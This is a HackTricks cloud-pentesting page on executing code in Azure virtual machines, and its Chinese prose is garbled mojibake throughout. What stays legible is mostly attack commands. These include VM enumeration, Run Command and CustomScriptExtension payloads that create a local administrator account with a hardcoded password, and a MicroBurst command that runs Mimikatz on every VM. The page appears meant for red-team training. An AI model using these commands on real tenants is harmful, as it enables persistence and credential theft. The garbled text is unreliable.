# Az - è™šæ‹Ÿæœºä¸ç½‘ç»œ

{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub ä»“åº“æäº¤ PR åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}

## åŸºæœ¬ä¿¡æ¯

[æ¥è‡ªæ–‡æ¡£ï¼š](https://learn.microsoft.com/en-us/azure/virtual-machines/overview) Azure è™šæ‹Ÿæœºæ˜¯ Azure æä¾›çš„å‡ ç§ç±»å‹çš„ [æŒ‰éœ€ã€å¯æ‰©å±•è®¡ç®—èµ„æº](https://learn.microsoft.com/en-us/azure/architecture/guide/technology-choices/compute-decision-tree) ä¹‹ä¸€ã€‚é€šå¸¸ï¼Œå½“æ‚¨éœ€è¦å¯¹è®¡ç®—ç¯å¢ƒæœ‰æ¯”å…¶ä»–é€‰æ‹©æ›´å¤šçš„æ§åˆ¶æ—¶ï¼Œæ‚¨ä¼šé€‰æ‹©è™šæ‹Ÿæœºã€‚æœ¬æ–‡æä¾›äº†åœ¨åˆ›å»ºè™šæ‹Ÿæœºä¹‹å‰åº”è€ƒè™‘çš„äº‹é¡¹ã€å¦‚ä½•åˆ›å»ºè™šæ‹Ÿæœºä»¥åŠå¦‚ä½•ç®¡ç†è™šæ‹Ÿæœºçš„ä¿¡æ¯ã€‚

## Azure ç½‘ç»œä¿¡æ¯

Azure ç½‘ç»œåŒ…å« **ä¸åŒçš„å®ä½“å’Œé…ç½®æ–¹å¼ã€‚** æ‚¨å¯ä»¥åœ¨ä»¥ä¸‹å†…å®¹ä¸­æ‰¾åˆ°ä¸åŒ Azure ç½‘ç»œå®ä½“çš„ç®€è¦ **æè¿°ã€** **ç¤ºä¾‹** å’Œ **æšä¸¾** å‘½ä»¤ï¼š

{% content-ref url="az-azure-network.md" %}
[az-azure-network.md](az-azure-network.md)
{% endcontent-ref %}

## Azure Bastion

**Azure Bastion** æä¾›äº†ä¸€ç§å®‰å…¨ã€å®Œå…¨æ‰˜ç®¡çš„ RDPï¼ˆè¿œç¨‹æ¡Œé¢åè®®ï¼‰å’Œ SSHï¼ˆå®‰å…¨å¤–å£³ï¼‰è®¿é—®è§£å†³æ–¹æ¡ˆï¼Œé€šè¿‡ Azure é—¨æˆ·é€šè¿‡ SSL è¿›è¡Œè®¿é—®ã€‚å®ƒé›†æˆåœ¨ Azure è™šæ‹Ÿç½‘ç»œä¸­ï¼Œå…è®¸ä½¿ç”¨ç§æœ‰ IP è¿›è¡Œ RDP å’Œ SSH è¿æ¥åˆ°è™šæ‹Ÿæœºï¼Œé¿å…äº†å¯¹å…¬å…± IP çš„éœ€æ±‚ã€‚è¿™ä½¿å…¶æˆä¸ºä¸€ç§æ¯”ä¼ ç»Ÿæ–¹æ³•æ›´å®‰å…¨ã€æ›´æ–¹ä¾¿çš„æ›¿ä»£æ–¹æ¡ˆï¼Œä¼ ç»Ÿæ–¹æ³•æ¶‰åŠå…¬å…± IP åˆ†é…å’Œ NSG è§„åˆ™é…ç½®ä»¥è®¿é—®è™šæ‹Ÿæœºã€‚å¼€å‘äººå‘˜å’Œ IT äººå‘˜å¯ä»¥é€šè¿‡ä»–ä»¬çš„ Web æµè§ˆå™¨å®‰å…¨åœ°ä» Azure é—¨æˆ·è®¿é—®è™šæ‹Ÿæœºï¼Œä»è€Œç®€åŒ–äº†å¼€å‘å’Œæµ‹è¯•ç¯å¢ƒçš„è¿‡ç¨‹ã€‚

è¦åˆ—å‡ºæ‚¨è®¢é˜…ä¸­çš„æ‰€æœ‰ Azure Bastion ä¸»æœºï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ï¼š

{% code overflow="wrap" %}
```bash
az network bastion list --query "[].{name:name, resourceGroup:resourceGrou, location:location}" -o table
```
{% endcode %}

## è™šæ‹Ÿæœºæšä¸¾
```powershell
# Get readable VMs
Get-AzVM | fl
# Lis running VMs
Get-AzureRmVM -status | where {$_.PowerState -EQ "VM running"} | select ResourceGroupName,Name
Get-AzVM -Name <name> -ResourceGroupName <res_group_name> | fl *
Get-AzVM -Name <name> -ResourceGroupName <res_group_name> | select -ExpandProperty NetworkProfile

# Get iface and IP address
Get-AzNetworkInterface -Name <interface_name>
Get-AzPublicIpAddress -Name <iface_public_ip_id>

#Get installed extensions
Get-AzVMExtension -ResourceGroupName <res_group_name> -VMName <name>

Get-AzVM | select -ExpandProperty NetworkProfile # Get name of network connector of VM
Get-AzNetworkInterface -Name <name> # Get info of network connector (like IP)
```
## **åœ¨è™šæ‹Ÿæœºä¸­è¿è¡Œå‘½ä»¤**

### **åœ¨è™šæ‹Ÿæœºä¸­è¿›è¡ŒAADç™»å½•**

å¯ä»¥å…è®¸é€šè¿‡AzureADè®¤è¯çš„ç”¨æˆ·è®¿é—®ã€‚ä¾‹å¦‚ï¼Œå°è¯•è®¿é—®ä¸€ä¸ª**linuxè™šæ‹Ÿæœº**ï¼š`ssh username@azure-corp.com@1.1.1.1`ï¼ˆåœ¨å°è¯•ç™»å½•æ—¶ï¼Œ**ä½¿ç”¨ä¸azurecorpç›¸åŒçš„ç”µå­é‚®ä»¶**éå¸¸é‡è¦ï¼‰ï¼Œæ‚¨å¯èƒ½ä¼šé‡åˆ°å¦‚ä¸‹é”™è¯¯ï¼š 

{% code overflow="wrap" %}
```
(username@azure-corp.com@1.1.1.1) This preview capability is not for production use. When you sign in, verify the name of the app on the sign-in screen is "Azure Linux VM Sign-in" and the IP address of the target VM is correct.

To sign in, use a web browser to open the page https://microsoft.com/devicelogin and enter the code DT4PNSTGR to authenticate. Press ENTER when ready.
```
{% endcode %}

åªéœ€**æŒ‰ç…§è¿™äº›è¯´æ˜**å‰å¾€ [https://microsoft.com/devicelogin](https://microsoft.com/devicelogin) å¹¶è¾“å…¥ä»£ç ï¼Œä½¿ç”¨ç”µå­é‚®ä»¶å’Œå¯†ç ä½œä¸ºå‡­æ®ï¼Œæ‚¨å°†èƒ½å¤Ÿé€šè¿‡ SSH è¿æ¥ï¼ˆå¦‚æœè¯¥ç”¨æˆ·å…·æœ‰è¶³å¤Ÿçš„æƒé™ï¼š`Virtual Machine Administrator Login` æˆ– `Virtual Machine User Login` è§’è‰²ï¼‰ã€‚

### **è¿è¡Œå‘½ä»¤**
```powershell
# The permission allowing this is Microsoft.Compute/virtualMachines/runCommand/action
Invoke-AzVMRunCommand -ScriptPath .\adduser.ps1 -CommandId 'RunPowerShellScript' -VMName 'juastavm' -ResourceGroupName 'Research' â€“Verbose
## Another way
Invoke-AzureRmVMRunCommand -ScriptPath .\adduser.ps1 -CommandId 'RunPowerShellScript' -VMName 'juastavm' -ResourceGroupName 'Research' â€“Verbose

# Content of the script
$passwd = ConvertTo-SecureString "Welcome2022!" -AsPlainText -Force
New-LocalUser -Name new_user -Password $passwd
Add-LocalGroupMember -Group Administrators -Member new_user
```

```powershell
# Try to run in every machine
Import-module MicroBurst.psm1
Invoke-AzureRmVMBulkCMD -Script Mimikatz.ps1 -Verbose -output Output.txt
```
### **è¿è¡Œè‡ªå®šä¹‰è„šæœ¬æ‰©å±•**

Azure è™šæ‹Ÿæœº (VM) æ‰©å±•æ˜¯ **å°å‹åº”ç”¨ç¨‹åº**ï¼Œç”¨äºåœ¨ **Azure VMs** ä¸Šæä¾›éƒ¨ç½²åé…ç½®å’Œè‡ªåŠ¨åŒ– **ä»»åŠ¡**ã€‚ä¾‹å¦‚ï¼Œå¦‚æœè™šæ‹Ÿæœºéœ€è¦è½¯ä»¶å®‰è£…ã€æ€æ¯’ä¿æŠ¤æˆ–åœ¨å…¶ä¸­è¿è¡Œè„šæœ¬çš„èƒ½åŠ›ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ VM æ‰©å±•ã€‚

å› æ­¤ï¼Œå¦‚æœæ‚¨æœ‰æƒé™è¿›è¡Œå†™å…¥ï¼Œæ‚¨å¯ä»¥æ‰§è¡Œä»»æ„ä»£ç ï¼š
```powershell
# Microsoft.Compute/virtualMachines/extensions/write
Set-AzVMExtension -ResourceGroupName "Research" -ExtensionName "ExecCmd" -VMName "infradminsrv" -Location "Germany West Central" -Publisher Microsoft.Compute -ExtensionType CustomScriptExtension -TypeHandlerVersion 1.8 -SettingString '{"commandToExecute":"powershell net users new_user Welcome2022. /add /Y; net localgroup administrators new_user /add"}'
```
### DesiredConfigurationState (DSC)

DesiredConfigurationState (DSC) æ˜¯ä¸€ä¸ªç±»ä¼¼äº Ansible çš„ PowerShell å·¥å…·ï¼Œç”¨äºé€šè¿‡ä»£ç è®¾ç½®ä¸»æœºã€‚DSC ä¸ Azure é›†æˆï¼Œå…è®¸ä¸Šä¼ ç‰¹å®šçš„é…ç½®æ–‡ä»¶ã€‚è¿™äº›æ–‡ä»¶å¿…é¡»éµå¾ªä¸¥æ ¼çš„è¯­æ³•ã€‚å€¼å¾—æ³¨æ„çš„æ˜¯ï¼ŒAzure ä¸­çš„ DSC æ‰©å±•å¯ä»¥æ‰§è¡Œç¬¦åˆæŸäº›æ ¼å¼æ ‡å‡†çš„æ–‡ä»¶ä¸­çš„å‘½ä»¤ï¼Œå³ä½¿è¯­æ³•ä¸ç¬¦åˆ DSC æ ‡å‡†ï¼Œå¦‚æä¾›çš„å›¾ç¤ºæ‰€ç¤ºã€‚

è¿™äº›å‘½ä»¤çš„æ‰§è¡Œæ˜¯é€šè¿‡ Az PowerShell ä¸­çš„ [**`Publish-AzVMDscConfiguration`**](https://docs.microsoft.com/en-us/powershell/module/az.compute/publish-azvmdscconfiguration?view=azps-7.5.0) å‡½æ•°æ¥å®ç°çš„ã€‚è¦æ±‚åŒ…æ‹¬ä¸€ä¸ªå®šä¹‰äº†å‡½æ•°çš„ **.PS1** æ–‡ä»¶ï¼Œå¹¶ä¸”è¯¥æ–‡ä»¶å¿…é¡»è¢«å‹ç¼©æˆ **.zip** æ–‡ä»¶ã€‚å°½ç®¡è¯­æ³•å¯èƒ½ä¸å‡†ç¡®ï¼Œä»£ç ä»ç„¶ä¼šæ‰§è¡Œã€‚ç„¶è€Œï¼Œæ‰©å±•ä¼šå°†æ‰§è¡ŒçŠ¶æ€æ ‡è®°ä¸ºâ€œå¤±è´¥â€ï¼Œå¹¶ä¸”ç”±äºçŠ¶æ€è¢«å¤±è´¥æ¶ˆæ¯è¦†ç›–ï¼Œå‘½ä»¤çš„è¾“å‡ºå°†ä¸å¯è§ã€‚

### VM Application Definitions

VM Application Definitions å…è®¸å°†ç‰ˆæœ¬åŒ–çš„åº”ç”¨ç¨‹åºé‡å¤éƒ¨ç½²åˆ° Azure VMã€‚æ­¤èµ„æºæ”¯æŒè·¨ VM çš„åº”ç”¨ç¨‹åºéƒ¨ç½²å’Œæ›´æ–°ã€‚è¦è®¾ç½®æ­¤åŠŸèƒ½ï¼Œéœ€è¦å‡ ä¸ªæ­¥éª¤ï¼Œæ¶‰åŠ Az PowerShell ä¸­çš„å‘½ä»¤ï¼Œå¦‚ **`New-AzGalleryApplication`** å’Œ **`New-AzGalleryApplicationVersion`**ã€‚

é€šè¿‡è¿™ç§æ–¹æ³•æ‰§è¡Œåº”ç”¨ç¨‹åºæˆ–å‘½ä»¤æ¶‰åŠ **"VMAppExtension"**ï¼Œè¯¥æ‰©å±•åœ¨åº”ç”¨ç¨‹åºåº”ç”¨åˆ° VM æ—¶è‡ªåŠ¨å®‰è£…ã€‚æ‰©å±•ä»æŒ‡å®šçš„ URI æ£€ç´¢æ–‡ä»¶ï¼Œå¹¶å°†å…¶å‘½åä¸ºä¸åº”ç”¨ç¨‹åºå®Œå…¨ç›¸åŒï¼Œä¸å¸¦æ‰©å±•åã€‚ä¸ºäº†æ­£ç¡®æ‰§è¡Œæ–‡ä»¶ï¼ŒREST API è°ƒç”¨ä¸­çš„ "ManageActions" å­—æ®µå¿…é¡»é…ç½®ä¸ºä½¿ç”¨é€‚å½“çš„æ‰©å±•åé‡å‘½åæ–‡ä»¶ã€‚æ­¤æ–¹æ³•çš„è®¾ç½®å®Œæˆåï¼Œå°†ç±»ä¼¼äºæä¾›çš„å›¾ç¤ºæ‰€ç¤ºçš„ç»“æ„ã€‚

ç„¶è€Œï¼Œè¿™ç§æ‰§è¡Œæ–¹æ³•ç›¸å¯¹è¾ƒæ…¢ï¼Œæ‰§è¡Œä¸€ä¸ªåº”ç”¨ç¨‹åºæˆ–å‘½ä»¤å¤§çº¦éœ€è¦ 3-4 åˆ†é’Ÿã€‚ä¸æ­¤è¿‡ç¨‹ç›¸å…³çš„æ–‡ä»¶å­˜å‚¨åœ¨ç‰¹å®šç›®å½•ä¸­ï¼ˆåº”ç”¨ç¨‹åºå‰¯æœ¬åœ¨ `C:\Packages\Plugins\Microsoft.CPlat.Core.VMApplicationManagerWindows\1.0.4\Downloads\`ï¼Œæ‰§è¡ŒçŠ¶æ€åœ¨ `C:\Packages\Plugins\Microsoft.CPlat.Core.VMApplicationManagerWindows\1.0.4\Status\`ï¼‰ã€‚

è¿™ä¸¤ç§æŠ€æœ¯æä¾›äº†åœ¨ Azure ç¯å¢ƒä¸­æ‰§è¡Œå‘½ä»¤å’Œéƒ¨ç½²åº”ç”¨ç¨‹åºçš„ç‹¬ç‰¹æ–¹å¼ï¼Œå„è‡ªå…·æœ‰ä¸åŒçš„è¦æ±‚ã€æ­¥éª¤å’Œè€ƒè™‘äº‹é¡¹ã€‚

### Hybrid Worker Groups (HWGs) in Azure

[**Hybrid Worker Groups (HWGs)**](https://docs.microsoft.com/en-us/azure/automation/automation-hybrid-runbook-worker) æ˜¯ Azure ä¸­çš„ä¸€é¡¹åŠŸèƒ½ï¼Œå…è®¸åœ¨æŒ‡å®š HWG çš„ Azure è™šæ‹Ÿæœº (VM) ä¸Šæ‰§è¡Œåœ¨è‡ªåŠ¨åŒ–å¸æˆ·ä¸­é…ç½®çš„ Runbookã€‚æ­¤æ‰§è¡Œé€šè¿‡å®‰è£…åœ¨ VM ä¸Šçš„æ‰©å±•æ¥å®ç°ï¼Œè¯¥æ‰©å±•å°† Runbook ä»£ç éƒ¨ç½²åˆ° VM ä¸Šã€‚æ­¤è¿‡ç¨‹çš„ä¸€ä¸ªé‡è¦æ–¹é¢æ˜¯ï¼Œå®é™…å‡­æ®åœ¨æ‰§è¡Œä¸­å¹¶ä¸æ˜¯ä¸€ä¸ªå› ç´ ï¼Œå› ä¸ºä»£ç ä»¥æå‡çš„æƒé™è¿è¡Œï¼Œå…·ä½“ä¸º **SYSTEM** æˆ– rootï¼Œå¦‚æä¾›çš„å›¾ç¤ºæ‰€ç¤ºã€‚

å¯¹äºä½¿ç”¨ Windows 10 VM çš„ç”¨æˆ·ï¼Œä¸€ä¸ªå…³é”®ç»†èŠ‚æ˜¯å¿…é¡»ä¸º Runbook æŒ‡å®š PowerShell ç‰ˆæœ¬ã€‚åº”è®¾ç½®ä¸ºä»¥ PowerShell ç‰ˆæœ¬ 5.1 è€Œä¸æ˜¯ 7.1 è¿è¡Œã€‚æ­¤è¦æ±‚æºäº PowerShell 7.1 åœ¨è¿™äº› VM ä¸Šä¸æ˜¯é»˜è®¤å®‰è£…çš„ï¼Œå¦‚æœæŒ‡å®šç‰ˆæœ¬ 7.1ï¼Œåˆ™ä¼šå¯¼è‡´è„šæœ¬æ‰§è¡Œå¤±è´¥ã€‚

Azure çš„è¿™ä¸€åŠŸèƒ½æä¾›äº†ä¸€ç§å¼ºå¤§çš„æ–¹æ³•ï¼Œç”¨äºåœ¨æ··åˆç¯å¢ƒä¸­è‡ªåŠ¨åŒ–å’Œç®¡ç†ä»»åŠ¡ï¼Œå…è®¸åœ¨ Azure VM ä¸Šé›†ä¸­ç®¡ç†å’Œæ‰§è¡Œä»»åŠ¡ã€‚

## References

* [https://learn.microsoft.com/en-us/azure/virtual-machines/overview](https://learn.microsoft.com/en-us/azure/virtual-machines/overview)
* [https://hausec.com/2022/05/04/azure-virtual-machine-execution-techniques/](https://hausec.com/2022/05/04/azure-virtual-machine-execution-techniques/)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
